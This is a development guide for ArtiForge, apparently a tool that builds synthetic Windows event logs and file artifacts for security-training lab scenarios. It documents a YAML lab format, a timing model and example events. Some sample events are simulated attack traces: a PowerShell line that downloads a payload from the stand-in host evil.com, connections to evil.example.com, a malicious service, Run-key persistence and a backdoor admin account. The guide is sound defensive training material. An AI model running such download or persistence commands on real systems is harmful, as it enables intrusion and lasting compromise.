# ArtiForge Lab Development Guide

This guide walks you through creating a new ArtiForge lab scenario from scratch.

---

## Quick Start

```bash
# Scaffold a new lab directory from the template
artiforge new-lab --id my-scenario --name "My Attack Scenario" --output ~/mylabs

# Edit the generated lab.yaml
code ~/mylabs/my-scenario/lab.yaml

# Validate before generating (catches errors early)
artiforge validate --lab-path ~/mylabs/my-scenario/lab.yaml

# Generate artifacts
artiforge generate --lab-path ~/mylabs/my-scenario/lab.yaml
```

---

## File Structure

After `new-lab`, your directory contains:

```
my-scenario/
├── lab.yaml          ← Main lab specification (edit this)
└── DEVELOPMENT.md    ← This guide
```

After `generate`:

```
artifacts/
└── my-scenario_20260219_091200/
    ├── events/               ← Windows XML event logs (one per host+channel)
    ├── elastic/
    │   └── bulk_import.ndjson  ← Elasticsearch bulk import
    ├── files/                ← Staged file artifacts per phase
    └── IMPORT.md             ← Import instructions
```

---

## Lab YAML Structure

### Top-Level Sections

```yaml
lab:         # Metadata (id, name, description, MITRE version)
infrastructure:  # Hosts, IPs, SIDs, users
attack:      # Base time, phases, events, file artifacts
```

### `lab` Section

```yaml
lab:
  id: my-scenario         # Lowercase, hyphens OK; used in output dir names
  name: "My Scenario"     # Human-readable; shown in artiforge list-labs
  description: >
    One to three sentences: what attack does this simulate, what technique
    it demonstrates, and what the trainee must find.
  mitre_version: "v14"
```

### `infrastructure` Section

Every host referenced in events must be declared here.

```yaml
infrastructure:
  domain: lab.local

  hosts:
    WIN-WS1:                       # Key used in phase/event "host:" fields
      ip: 10.10.10.10
      fqdn: WIN-WS1.lab.local
      os: "Windows 10 22H2"
      sid_prefix: "S-1-5-21-3456789012-2345678901-1234567890"  # Unique per host
      users:
        - username: victim.user    # Referenced in phase/event "user:" fields
          domain: LAB
          rid: 1001                # Unique relative ID per host
```

**SID prefix tips:**
- Must be unique per host
- Use the format `S-1-5-21-<10-digit>-<10-digit>-<10-digit>`
- Change only the last group of digits between hosts

### `attack` Section

```yaml
attack:
  base_time: "2026-01-01T09:00:00Z"   # Override with --base-time at runtime
  malicious_account: attacker_acct     # Used in default 4720/4732 event fields
  phases:
    - id: 1
      name: "Initial Access"
      mitre: [T1566.001]       # List of ATT&CK technique IDs
      offset_minutes: 0        # Phase start relative to base_time
      host: WIN-WS1            # Default host for all events in this phase
      user: victim.user        # Default user for all events in this phase
      events: [...]
      file_artifacts: [...]
```

---

## Timing Model

```
base_time
  │
  ├─ Phase 1  offset_minutes: 0
  │     ├─ event A  offset_seconds: 0   → base_time + 0m + 0s
  │     ├─ event B  offset_seconds: 5   → base_time + 0m + 5s
  │     └─ event C  offset_seconds: 10  → base_time + 0m + 10s
  │
  ├─ Phase 2  offset_minutes: 15
  │     └─ event D  offset_seconds: 0   → base_time + 15m + 0s
  │
  └─ Phase 3  offset_minutes: 60
        └─ event E  offset_seconds: 5   → base_time + 60m + 5s
```

Rules:
- `offset_minutes` must be >= 0, and phases should be in ascending order
- `offset_seconds` must be >= 0 within each phase
- Events across phases may have any gap — ArtiForge does not enforce realism here

---

## Supported Channels and EIDs

| Channel     | Log Name                                    | EIDs |
|-------------|---------------------------------------------|------|
| Security    | Security                                    | 4624, 4625, 4634, 4648, 4672, 4688, 4698, 4720, 4732, 4776 |
| System      | System                                      | 7036, 7045 |
| Sysmon      | Microsoft-Windows-Sysmon/Operational        | 1, 3, 11, 13, 22 |
| Application | Application                                 | 1 |
| PowerShell  | Microsoft-Windows-PowerShell/Operational    | 4103, 4104 |

---

## Common Event Patterns

### Process Creation (pair Security 4688 + Sysmon 1)

Always use the same `offset_seconds` so timestamps align.

```yaml
- channel: Security
  eid: 4688
  offset_seconds: 5
  fields:
    NewProcessName: 'C:\Windows\System32\cmd.exe'
    CommandLine: 'cmd.exe /c whoami'
    ParentProcessName: 'C:\Windows\explorer.exe'
    TokenElevationType: '%%1938'    # %%1938=limited  %%1937=full  %%1936=default

- channel: Sysmon
  eid: 1
  offset_seconds: 5
  fields:
    ProcessGuid: &cmd_guid '{AAAAAAAA-BBBB-CCCC-DDDD-EEEEEEEEEEEE}'
    Image: 'C:\Windows\System32\cmd.exe'
    CommandLine: 'cmd.exe /c whoami'
    ParentImage: 'C:\Windows\explorer.exe'
    User: 'LAB\victim.user'
    IntegrityLevel: Medium
    Hashes: 'MD5=AABBCCDDEEFF00112233445566778899,SHA256=AABBCC...'
```

### Network Connection (Sysmon 3 after process creation)

Use YAML anchors (`&name` / `*name`) to share ProcessGuid with the Sysmon 1 above.

```yaml
- channel: Sysmon
  eid: 3
  offset_seconds: 8
  fields:
    ProcessGuid: *cmd_guid          # References the anchor defined on Sysmon 1
    Image: 'C:\Windows\System32\cmd.exe'
    Protocol: tcp
    Initiated: 'true'
    SourceIp: 10.10.10.10
    DestinationIp: 1.2.3.4
    DestinationHostname: evil.example.com
    DestinationPort: 443
    DestinationPortName: https
```

### DNS Query (Sysmon 22 before network connection)

```yaml
- channel: Sysmon
  eid: 22
  offset_seconds: 7               # Slightly before Sysmon 3
  fields:
    ProcessGuid: *cmd_guid
    Image: 'C:\Windows\System32\cmd.exe'
    QueryName: evil.example.com
    QueryStatus: '0'
    QueryResults: 'type:  5 evil.example.com;1.2.3.4;'
```

### Interactive Logon (Security 4624)

```yaml
- channel: Security
  eid: 4624
  offset_seconds: 0
  fields:
    TargetUserName: victim.user
    TargetDomainName: LAB
    LogonType: '2'              # 2=interactive  3=network  10=RDP
    LogonProcessName: User32
    AuthenticationPackageName: Negotiate
    WorkstationName: WIN-WS1
    IpAddress: '-'
    IpPort: '-'
    ProcessName: 'C:\Windows\System32\winlogon.exe'
```

### Explicit Credentials (Security 4648)

```yaml
- channel: Security
  eid: 4648
  offset_seconds: 0
  fields:
    SubjectUserName: victim.user
    SubjectDomainName: LAB
    TargetUserName: target.user
    TargetDomainName: WIN-DC1
    TargetServerName: WIN-DC1
    TargetInfo: WIN-DC1.lab.local
    ProcessName: 'C:\Windows\System32\mstsc.exe'
    IpAddress: 10.10.10.10
    IpPort: '0'
```

### Scheduled Task Created (Security 4698)

```yaml
- channel: Security
  eid: 4698
  offset_seconds: 5
  fields:
    SubjectUserName: victim.user
    SubjectDomainName: LAB
    TaskName: '\WindowsUpdaterTask'
```

### Service Installed / Started (System 7045 + 7036)

```yaml
- channel: System
  eid: 7045
  offset_seconds: 10
  fields:
    ServiceName: EvilSvc
    ImagePath: 'C:\Windows\Temp\evil.exe'
    ServiceType: 'user mode service'
    StartType: 'auto start'
    AccountName: LocalSystem

- channel: System
  eid: 7036
  offset_seconds: 12
  fields:
    param1: EvilSvc
    param2: running
```

### PowerShell Script Block (PowerShell 4104)

```yaml
- channel: PowerShell
  eid: 4104
  offset_seconds: 10
  fields:
    ScriptBlockText: 'Invoke-WebRequest -Uri http://evil.com/payload -OutFile C:\Temp\p.exe'
    MessageNumber: '1'
    MessageTotal: '1'
```

### New Local Account (Security 4720 + 4732)

```yaml
- channel: Security
  eid: 4720
  offset_seconds: 20
  fields:
    SubjectUserName: SYSTEM
    SubjectDomainName: NT AUTHORITY
    TargetUserName: backdoor_acct
    TargetDomainName: WIN-SRV1

- channel: Security
  eid: 4732
  offset_seconds: 21
  fields:
    SubjectUserName: SYSTEM
    SubjectDomainName: NT AUTHORITY
    MemberName: backdoor_acct
    TargetUserName: Administrators
    TargetDomainName: WIN-SRV1
```

### File Drop (Sysmon 11)

```yaml
- channel: Sysmon
  eid: 11
  offset_seconds: 10
  fields:
    Image: 'C:\Windows\System32\cmd.exe'
    TargetFilename: 'C:\Users\victim.user\AppData\Local\Temp\payload.exe'
    User: 'LAB\victim.user'
```

### Registry Modification (Sysmon 13)

```yaml
- channel: Sysmon
  eid: 13
  offset_seconds: 12
  fields:
    Image: 'C:\Windows\System32\reg.exe'
    TargetObject: 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater'
    Details: 'C:\Users\victim.user\AppData\Local\Temp\payload.exe'
    User: 'LAB\victim.user'
```

---

## Cross-Host Events

Override the phase-default `host` and `user` on individual events:

```yaml
- id: 3
  name: "Lateral Movement"
  offset_minutes: 60
  host: WIN-WS1          # default host for most events
  user: victim.user

  events:
    # This fires on the SOURCE host
    - channel: Security
      eid: 4648
      offset_seconds: 0
      # host/user inherited from phase → WIN-WS1 / victim.user
      fields: ...

    # This fires on the TARGET host — override host and user
    - channel: Security
      eid: 4624
      offset_seconds: 5
      host: WIN-DC1        # override phase host
      user: target.user    # override phase user
      fields:
        LogonType: '10'
        ...
```

---

## File Artifacts

```yaml
file_artifacts:
  - type: lnk               # Windows shortcut (.lnk)
    dest: 'C:\Users\victim.user\Desktop\Resume.lnk'
    target: 'C:\Windows\System32\ie4uinit.exe'
    args: '-BaseSettings'

  - type: xsl               # XSL stylesheet (LOLBAS)
    dest: 'C:\Users\victim.user\AppData\Local\Temp\style.xsl'

  - type: inf               # INF install script
    dest: 'C:\Users\victim.user\AppData\Local\Temp\setup.inf'

  - type: xml_task          # Scheduled task XML
    dest: 'C:\Windows\Temp\task.xml'
    task_name: '\MyTask'
    command: 'C:\Windows\Temp\evil.exe'

  - type: binary_placeholder  # Zero-byte stub with realistic filename
    dest: 'C:\Windows\Temp\evil.exe'

  - type: raw               # Arbitrary content
    dest: 'C:\Temp\note.txt'
    content_template: "This is the file content.\n"
```

---

## YAML Anchors for ProcessGuid Correlation

Events in the same process chain share a `ProcessGuid`. Use YAML anchors so
you define the GUID once and reference it everywhere:

```yaml
# Define the anchor on Sysmon 1 (process creation)
- channel: Sysmon
  eid: 1
  fields:
    ProcessGuid: &chrome_guid '{B1C2D3E4-F5A6-B7C8-D9E0-F1A2B3C4D5E6}'
    Image: 'C:\Program Files\Google\Chrome\chrome.exe'

# Reference it on Sysmon 3 (network connection by the same process)
- channel: Sysmon
  eid: 3
  fields:
    ProcessGuid: *chrome_guid
    DestinationIp: 1.2.3.4
```

Use a real-looking GUID (8-4-4-4-12 hex format). Generate one with:
```python
python3 -c "import uuid; print(str(uuid.uuid4()).upper())"
```

---

## Validation Workflow

```bash
# 1. Validate schema and EID support before generating
artiforge validate --lab-path ./lab.yaml

# 2. Preview what will be generated (no files written)
artiforge generate --lab-path ./lab.yaml --dry-run

# 3. Generate with a specific timestamp
artiforge generate --lab-path ./lab.yaml --base-time "2026-06-01T08:30:00Z"

# 4. Generate only selected phases for faster iteration
artiforge generate --lab-path ./lab.yaml --phases 1,2
```

---

## Adding a New EID

If your scenario needs an EID not in the supported list:

1. Identify the channel (Security, System, Sysmon, Application, PowerShell)
2. Open the matching generator file: `artiforge/generators/<channel>.py`
3. Add a function `eid_NNNN(fields, host, user, spec, ts)` following the pattern of existing functions
4. Register it in the `_GENERATORS` dict at the bottom of the file

Example — adding Security EID 4625 (failed logon):
```python
def eid_4625(fields: dict, host: Host, user: User | None,
             spec, ts: datetime) -> dict:
    return {
        "SubjectUserName": "SYSTEM",
        "SubjectDomainName": "NT AUTHORITY",
        "TargetUserName": fields.get("TargetUserName", user.username if user else "-"),
        "TargetDomainName": fields.get("TargetDomainName", user.domain if user else "-"),
        "FailureReason": fields.get("FailureReason", "%%2313"),  # Unknown user name
        "Status": fields.get("Status", "0xc000006d"),
        "SubStatus": fields.get("SubStatus", "0xc0000064"),
        "LogonType": fields.get("LogonType", "3"),
        **fields,
    }

_GENERATORS[4625] = eid_4625
```

---

## Common Mistakes

| Mistake | Fix |
|---------|-----|
| `host: WIN-SRV1` in event but `WIN-SRV1` not in `infrastructure.hosts` | Add the host to `infrastructure` |
| `user: target.user` but no `target.user` in that host's `users` list | Add the user, or override with `user:` on the specific event |
| YAML anchor referenced before it's defined | Move the `&anchor` definition to the first event that uses the GUID |
| `offset_seconds: -5` | Offset must be >= 0; use a larger `offset_minutes` on the phase |
| EID not in supported list | Run `artiforge validate` to see which EIDs are unsupported, then add a generator |
| Two phases with the same `id` | Phase IDs must be unique integers |
| `TokenElevationType: 1938` | Must be the string `'%%1938'` with percent signs |
